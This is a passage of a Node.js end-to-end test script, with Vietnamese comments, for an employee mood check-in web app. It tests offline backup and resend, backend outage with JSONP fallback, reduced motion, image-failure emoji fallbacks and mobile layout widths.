    if (kill) kill(); if (srv) await srv.close(); if (mock) await mock.stop();
  }
}

/* ================= KỊCH BẢN offline: mất mạng thật (Network.emulateNetworkConditions) → có mạng lại → gửi lại ================= */
async function scenarioOffline() {
  let mock = null, srv = null, kill = null, browserLog = [], consoleApi = [], requests = [];
  let page;
  const setOffline = (p, off) => p.send('Network.emulateNetworkConditions', { offline: off, latency: 0, downloadThroughput: -1, uploadThroughput: -1 });
  try {
    mock = await startMock(false);
    srv = await startStatic({ port: STATIC_PORT, appDir: APP, mockUrl: mock.url });
    ({ page, kill, browserLog } = await openApp({}));
    await setOffline(page, true);
    await sleep(100);
    const onLine = await page.evaluate('navigator.onLine');
    note('navigator.onLine khi giả lập offline = ' + onLine);
    await typeId(page, '1001');
    await waitFor(page, "document.querySelector('#greet .lookup-state').textContent.startsWith('Mình chưa')", 3000);
    let s = await qa(page);
    T('US-1 offline: nhập xong → xử lý như không tìm thấy, không đỏ', (await text(page, '#greet .lookup-state')) === TXT.notFound && (await text(page, '#greet .greeting')) === TXT.hello && (await noRed(page)) === '', await greet(page));
    T('US-1 offline: chỉ console.warn, không console.error', s.errors.length === 0 && s.warns.length >= 1, JSON.stringify({ warns: s.warns, errors: s.errors }));
    T('US-3 offline chuẩn bị: chọn thẻ "Khó chịu"', await pickCard(page, 'irritated'));
    T('US-3 offline: nút sẵn sàng rồi mới bấm', !!(await waitReady(page)));
    await page.click('#btn-submit');
    await waitFor(page, "!document.getElementById('thanks').hidden", 2000);
    s = await qa(page);
    const dt = s.thanksShownAt - s.clickAt;
    T('US-3 offline: sang cám ơn < 300 ms', s.thanksShownAt > 0 && dt < 300, dt.toFixed(1) + ' ms');
    T('US-3 offline: không alert', s.alerts === 0);
    await sleep(800);
    s = await qa(page);
    let bk = await backup(page);
    T('US-3 offline: bản ghi nằm trong localStorage, sent:false', bk.length === 1 && bk[0].sent === false && bk[0].employeeId === '1001' && bk[0].emotion === 'Khó chịu', JSON.stringify(bk[0]));
    T('A.8 offline: console.warn đúng chữ "checkin: gửi thất bại, đã giữ bản sao localStorage"', s.warns.includes(TXT.sendFail), JSON.stringify(s.warns));
    T('US-3 offline: không console.error', s.errors.length === 0, JSON.stringify(s.errors));
    T('US-4 offline: mock không có dòng nào', mock.rows().length === 0);
    fs.writeFileSync(path.join(OUT, 'console-offline.txt'), ['--- warns ---'].concat(s.warns, ['--- errors ---'], s.errors, ['--- browser ---'], browserLog).join('\n'));

    /* --- Có mạng lại + tải lại trang → resendPending gửi lại im lặng, thành công thì xóa --- */
    const sidOffline = bk[0].sessionId;
    await setOffline(page, false);
    await sleep(100);
    await page.navigate(APP_URL);
    const emptied = await waitFor(page, "localStorage.getItem('checkin_vao_ca_backup') === '[]'", 3000);
    await sleep(200);
    s = await qa(page);
    bk = await backup(page);
    const resent = posts(s);
    const body = resent.length ? JSON.parse(resent[0].body) : {};
    T('P1 gửi lại: có mạng + tải lại trang → đúng 1 POST gửi lại, cùng sessionId, payload đúng 7 trường (bỏ cờ sent)', resent.length === 1 && body.sessionId === sidOffline && Object.keys(body).join(',') === PAYLOAD_KEYS && resent[0].keepalive === true, JSON.stringify(body));
    const rows = mock.rows();
    T('P1 gửi lại: mock nhận 1 dòng – mã 1001, Tên tra được "Nguyễn Thị Hạnh" (lúc offline client không có tên), Khó chịu', rows.length === 1 && rows[0].employeeId === '1001' && rows[0].name === 'Nguyễn Thị Hạnh' && rows[0].emotion === 'Khó chịu' && rows[0].sessionId === sidOffline, JSON.stringify(rows));
    T('P1 gửi lại: mock trả success → localStorage về []', !!emptied && bk.length === 0, JSON.stringify(bk));
    T('P1 gửi lại: im lặng – không console.warn, không console.error', s.warns.length === 0 && s.errors.length === 0, JSON.stringify({ warns: s.warns, errors: s.errors }));

    /* --- Trần gửi lại: 7 bản chờ → chỉ 5 bản mới nhất được gửi, 2 bản cũ nhất nằm lại --- */
    const seed = Array.from({ length: 7 }, (_, i) => ({ created_at: '', sessionId: 'pending-' + i, employeeId: '1002', name: '', level: 6, levelText: 'Tạm ổn', emotion: 'Vui vẻ', sent: false }));
    await page.evaluate("localStorage.setItem('checkin_vao_ca_backup', " + JSON.stringify(JSON.stringify(seed)) + "); true");
    await page.navigate(APP_URL);
    await waitFor(page, "JSON.parse(localStorage.getItem('checkin_vao_ca_backup') || '[]').length === 2", 3000);
    await sleep(300);
    s = await qa(page);
    bk = await backup(page);
    const sent5 = posts(s).map(p => JSON.parse(p.body).sessionId);
    T('P1 gửi lại tối đa 5: 7 bản chờ → 5 POST cho pending-2..6, còn lại pending-0, pending-1', sent5.join(',') === 'pending-2,pending-3,pending-4,pending-5,pending-6' && bk.map(x => x.sessionId).join(',') === 'pending-0,pending-1', JSON.stringify({ sent5, left: bk.map(x => x.sessionId) }));
    T('P1 gửi lại tối đa 5: mock thêm 5 dòng (tổng 6), Tên tra theo mã 1002 "Trần Văn Minh"', mock.rows().length === 6 && mock.rows().slice(1).every(r => r.name === 'Trần Văn Minh' && r.employeeId === '1002'), mock.rows().length + ' dòng');
    T('P1 gửi lại tối đa 5: im lặng, không console.warn/error', s.warns.length === 0 && s.errors.length === 0, JSON.stringify(s.warns));
    await page.evaluate("localStorage.removeItem('checkin_vao_ca_backup'); true");
  } finally {
    if (kill) kill(); if (srv) await srv.close(); if (mock) await mock.stop();
  }
}

/* ================= KỊCH BẢN down: Apps Script sập (cổng không ai nghe) ================= */
async function scenarioDown() {
  let mock = null, srv = null, kill = null, browserLog = [], consoleApi = [], requests = [];
  let page;
  try {
    srv = await startStatic({ port: STATIC_PORT, appDir: APP, mockUrl: 'http://127.0.0.1:' + DEAD_PORT + '/' });
    ({ page, kill, browserLog } = await openApp({}));
    await typeId(page, '1001');
    const t0 = Date.now();
    await waitFor(page, "document.querySelector('#greet .lookup-state').textContent.startsWith('Mình chưa')", 3000);
    let s = await qa(page);
    T('US-1 mock tắt: fetch lỗi → JSONP dự phòng → không tìm thấy mềm, không đỏ', (await text(page, '#greet .lookup-state')) === TXT.notFound && (await noRed(page)) === '', await greet(page) + ' sau ' + (Date.now() - t0) + ' ms');
    T('US-1 mock tắt: chỉ console.warn (JSONP lỗi), không console.error', s.errors.length === 0 && s.warns.some(w => /JSONP/.test(w)), JSON.stringify({ warns: s.warns, errors: s.errors }));
    T('US-1 mock tắt: đã thử JSONP (<script> callback) rồi gỡ ngay (lỗi tải, không phải quá giờ)', (await page.evaluate("document.querySelectorAll('script[src*=callback]').length")) === 0 && (await page.evaluate("Object.keys(window).filter(k => k.startsWith('__capyLookup')).length")) === 0);
    T('US-3 mock tắt chuẩn bị: chọn thẻ "Vui vẻ"', await pickCard(page, 'happy'));
    T('US-3 mock tắt: nút sẵn sàng rồi mới bấm', !!(await waitReady(page)));
    await page.click('#btn-submit');
    await waitFor(page, "!document.getElementById('thanks').hidden", 2000);
    s = await qa(page);
    const dt = s.thanksShownAt - s.clickAt;
    T('US-3 mock tắt: sang cám ơn < 300 ms', s.thanksShownAt > 0 && dt < 300, dt.toFixed(1) + ' ms');
    await sleep(800);
    s = await qa(page);
    let bk = await backup(page);
    T('A.8 mock tắt: console.warn đúng chữ gửi thất bại, backup giữ sent:false', s.warns.includes(TXT.sendFail) && bk.length === 1 && bk[0].sent === false, JSON.stringify(s.warns));
    T('US-3 mock tắt: không console.error, không alert', s.errors.length === 0 && s.alerts === 0, JSON.stringify(s.errors));
    note('Trình duyệt tự ghi net::ERR_CONNECTION_REFUSED vào DevTools (không phải app): ' + browserLog.filter(l => /ERR_/.test(l)).length + ' dòng.');
    /* tải lại trang khi máy chủ vẫn sập → gửi lại im lặng, thất bại, bản vẫn giữ, không warn */
    const sid = bk[0].sessionId;
    await page.navigate(APP_URL);
    await sleep(800);
    s = await qa(page);
    bk = await backup(page);
    T('P1 mock tắt: tải lại trang → 1 POST gửi lại im lặng thất bại → vẫn giữ 1 bản sent:false, KHÔNG console.warn', posts(s).length === 1 && bk.length === 1 && bk[0].sent === false && bk[0].sessionId === sid && s.warns.length === 0 && s.errors.length === 0, JSON.stringify({ posts: posts(s).length, bk, warns: s.warns }));
    fs.writeFileSync(path.join(OUT, 'console-down.txt'), ['--- warns ---'].concat(s.warns, ['--- errors ---'], s.errors, ['--- browser ---'], browserLog).join('\n'));
  } finally {
    if (kill) kill(); if (srv) await srv.close(); if (mock) await mock.stop();
  }
}

/* ================= KỊCH BẢN reduced: prefers-reduced-motion ================= */
async function scenarioReduced() {
  let mock = null, srv = null, kill = null, browserLog = [], consoleApi = [], requests = [];
  let page;
  try {
    mock = await startMock(false);
    srv = await startStatic({ port: STATIC_PORT, appDir: APP, mockUrl: mock.url });
    ({ page, kill } = await openApp({ reducedMotion: true }));
    T('US-2 reduce: matchMedia(prefers-reduced-motion: reduce) = true', await page.evaluate("matchMedia('(prefers-reduced-motion: reduce)').matches"));
    await typeId(page, '1001');
    await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('Hạnh')", 2500);
    T('US-2 reduce chuẩn bị: chọn thẻ "Buồn"', await pickCard(page, 'sad'));
    await sleep(400);
    const b = await btn(page);
    T('US-2 reduce: nút thức dậy KHÔNG đập nhịp (animation none), vẫn sáng', b.ready && b.anim === 'none' && b.opacity === '1', JSON.stringify(b));
    const badge = await page.evaluate("(() => { const cs = getComputedStyle(document.querySelector('.capy-card.selected .check-mark-badge')); return [parseFloat(cs.animationDuration), cs.animationIterationCount]; })()");
    T('US-2 reduce: huy hiệu ✓ gần như không animation (≤ 0.001 s, 1 lần)', badge[0] <= 0.001 && badge[1] === '1', JSON.stringify(badge));
    T('US-2 reduce: nút sẵn sàng rồi mới bấm → sang cám ơn', await submit(page));
    const tick = await page.evaluate("(() => { const s = document.querySelector('.success-checkmark'), c = document.querySelector('.checkmark-circle'), k = document.querySelector('.checkmark-check'); return { still: s.classList.contains('still'), sAnim: getComputedStyle(s).animationName, cAnim: getComputedStyle(c).animationName, kAnim: getComputedStyle(k).animationName, cOff: getComputedStyle(c).strokeDashoffset, kOff: getComputedStyle(k).strokeDashoffset }; })()");
    T('US-2 reduce: tick xanh hiện tĩnh (.still, animation none, dashoffset 0)', tick.still && tick.sAnim === 'none' && tick.cAnim === 'none' && tick.kAnim === 'none' && tick.cOff === '0px' && tick.kOff === '0px', JSON.stringify(tick));
    await page.screenshot(path.join(OUT, 'shot-thanks-reduced.png'), true);
    T('US-4 reduce: mock trả success → hàng chờ rỗng', !!(await backupEmpty(page)));
    const s = await qa(page);
    T('Console reduce: sạch', s.errors.length === 0 && s.warns.length === 0, JSON.stringify({ warns: s.warns, errors: s.errors }));
  } finally {
    if (kill) kill(); if (srv) await srv.close(); if (mock) await mock.stop();
  }
}

/* ================= KỊCH BẢN imgfail: ảnh capybara không tải được ================= */
async function scenarioImgFail() {
  let mock = null, srv = null, kill = null, browserLog = [], consoleApi = [], requests = [];
  let page;
  try {
    mock = await startMock(false);
    srv = await startStatic({ port: STATIC_PORT, appDir: APP, mockUrl: mock.url });
    ({ page, kill, browserLog } = await openApp({ failImages: true, height: 1400 }));
    await page.evaluate("document.getElementById('capy-grid').scrollIntoView(); true");
    await waitFor(page, "document.querySelectorAll('#capy-grid img').length === 0 && document.getElementById('level-img').tagName === 'DIV'", 4000);
    const cs = await cards(page);
    T('US-2 ảnh lỗi: 6 thẻ đều thay emoji đúng data.js, không còn <img>', cs.every(c => !c.hasImg) && cs.map(c => c.emoji).join('') === '😊😢😟😠😨😩', JSON.stringify(cs.map(c => c.label + ':' + c.emoji + ':' + c.hasImg)));
    const sz = await page.evaluate("[...document.querySelectorAll('#capy-grid .capy-emoji')].map(e => Math.round(e.getBoundingClientRect().width) + 'x' + Math.round(e.getBoundingClientRect().height)).join(',')");
    T('US-2 ảnh lỗi: ô emoji thẻ giữ khung 72×72, không vỡ', sz === '72x72,72x72,72x72,72x72,72x72,72x72', sz);
    let lv = await level(page);
    T('US-2 ảnh lỗi: ảnh mức → div.fallback "😐" 130×130', lv.tag === 'DIV' && lv.emoji === '😐' && Math.round(lv.w) === 130 && Math.round(lv.h) === 130, JSON.stringify(lv));
    await page.evaluate("(() => { const r = document.getElementById('level-range'); r.value = 1; r.dispatchEvent(new Event('input', { bubbles: true })); return true; })()");
    await waitFor(page, "document.getElementById('level-img').tagName === 'DIV' && document.getElementById('level-img').textContent === '😩'", 3000);
    lv = await level(page);
    T('US-2 ảnh lỗi: đổi mức 1 (sau debounce 150 ms) → thử ảnh mới, lỗi → emoji "😩" của mức 1', lv.tag === 'DIV' && lv.emoji === '😩' && lv.label === '1 · Rất mệt', JSON.stringify(lv));
    const overflow = await page.evaluate('document.documentElement.scrollWidth <= innerWidth');
    T('US-2 ảnh lỗi: không tràn ngang', overflow);
    await page.evaluate("document.getElementById('level-img').scrollIntoView({block:'center'}); true");
    await page.screenshot(path.join(OUT, 'shot-imgfail-375.png'), true);
    const s = await qa(page);
    T('Console imgfail: app không console.error (lỗi ảnh chỉ ở trình duyệt)', s.errors.length === 0, JSON.stringify(s.errors));
    note('Trình duyệt ghi ' + browserLog.filter(l => /raw\.githubusercontent/.test(l)).length + ' dòng lỗi tải ảnh (net::ERR_FAILED) – bình thường.');
  } finally {
    if (kill) kill(); if (srv) await srv.close(); if (mock) await mock.stop();
  }
}

/* ================= KỊCH BẢN layout: 375 px / 440 / 480 / 520 ================= */
async function scenarioLayout() {
  let mock = null, srv = null, kill = null, browserLog = [], consoleApi = [], requests = [];
  let page;
  try {
    mock = await startMock(false);
    srv = await startStatic({ port: STATIC_PORT, appDir: APP, mockUrl: mock.url });
    ({ page, kill } = await openApp({ height: 1500 }));
    const measure = () => page.evaluate("(() => { const cols = getComputedStyle(document.getElementById('capy-grid')).gridTemplateColumns.split(' ').length; const over = [...document.querySelectorAll('body *')].filter(e => !e.matches('.skip-link, .sr-only')).filter(e => { const b = e.getBoundingClientRect(); return b.width > 0 && (b.right > innerWidth + 0.5 || b.left < -0.5); }).map(e => e.tagName + '.' + e.className).slice(0, 5); return { w: innerWidth, cols, scrollW: document.documentElement.scrollWidth, over }; })()");
    let m = await measure();
    T('Layout 375: 2 cột thẻ, không tràn ngang', m.cols === 2 && m.scrollW <= 375 && m.over.length === 0, JSON.stringify(m));
    const taps = await page.evaluate("[...document.querySelectorAll('#employee-id, #level-range, .capy-card, #btn-submit')].map(e => e.id || e.className.split(' ')[0]).map((n, i, a) => { const el = document.querySelectorAll('#employee-id, #level-range, .capy-card, #btn-submit')[i]; const b = el.getBoundingClientRect(); return n + ':' + Math.round(b.width) + 'x' + Math.round(b.height); }).join(',')");
    const tapsOk = taps.split(',').every(t => { const [, wh] = t.split(':'); const [w, h] = wh.split('x').map(Number); return w >= 44 && h >= 44; });
    T('Layout 375: mọi vùng chạm ≥ 44 px', tapsOk, taps);
    await page.screenshot(path.join(OUT, 'shot-card-375.png'), true);
    for (const [w, want] of [[440, 2], [441, 3], [480, 3], [520, 3]]) {
      await page.send('Emulation.setDeviceMetricsOverride', { width: w, height: 1500, deviceScaleFactor: 2, mobile: true });
      await sleep(150);
      m = await measure();
      T('Layout ' + w + ': ' + want + ' cột, không tràn', m.cols === want && m.scrollW <= w && m.over.length === 0, JSON.stringify(m));
    }
    await page.screenshot(path.join(OUT, 'shot-card-520.png'), true);
    await page.send('Emulation.setDeviceMetricsOverride', { width: 320, height: 1500, deviceScaleFactor: 2, mobile: true });
    await sleep(150);
    m = await measure();
    T('Layout 320 (biên nhỏ): không tràn ngang', m.scrollW <= 320 && m.over.length === 0, JSON.stringify(m));
  } finally {
    if (kill) kill(); if (srv) await srv.close(); if (mock) await mock.stop();
  }
}

/* ===== Chạy ===== */
const SCENARIOS = { main: scenarioMain, slow: scenarioSlow, offline: scenarioOffline, down: scenarioDown, reduced: scenarioReduced, imgfail: scenarioImgFail, layout: scenarioLayout };
(async () => {
  const names = argv.only ? String(argv.only).split(',') : Object.keys(SCENARIOS);
  for (const n of names) {
    scenarioName = n;
    console.log('\n=== Kịch bản ' + n + ' ===');
    try { await SCENARIOS[n](); }
    catch (e) { fails++; results.push('CRASH [' + n + '] ' + (e && e.stack || e)); console.log('CRASH', e); }
  }
  /* Dọn và kiểm vệ sinh: không file dữ liệu trong app, không chạm file mặc định của mock, xóa mock-run */
  scenarioName = 'dọn';
  T('Vệ sinh: không có tools/mock-data.json trong thư mục app', !fs.existsSync(MOCK_DATA_IN_APP));
  T('Vệ sinh: test không ghi vào file mặc định của mock ' + MOCK_DATA_DEFAULT, statOf(MOCK_DATA_DEFAULT) === defaultDataBefore, defaultDataBefore + ' → ' + statOf(MOCK_DATA_DEFAULT));
  T("Vệ sinh: js/config.js không trỏ localhost (rỗng hoặc URL script thật)", /GOOGLE_SCRIPT_URL: '(|https:\/\/script\.google\.com\/[^']+)'/.test(fs.readFileSync(path.join(APP, 'js', 'config.js'), 'utf8')));
  try { fs.rmSync(MOCK_RUN_DIR, { recursive: true, force: true }); } catch (e) { /* bỏ qua */ }
  T('Vệ sinh: đã xóa thư mục dữ liệu mock tạm của test', !fs.existsSync(MOCK_RUN_DIR));
  const pass = results.filter(r => r.startsWith('PASS')).length;
  const total = results.filter(r => /^(PASS|FAIL|CRASH)/.test(r)).length;
  const summary = '\n' + pass + '/' + total + ' PASS, ' + fails + ' FAIL' + (results.some(r => r.startsWith('CRASH')) ? ' (có CRASH)' : '');
  console.log(summary);
  fs.writeFileSync(path.join(OUT, 'e2e-results.txt'), results.join('\n') + '\n' + summary + '\n');
  console.log('Kết quả: ' + path.join(OUT, 'e2e-results.txt'));
  process.exit(fails ? 1 : 0);
})();
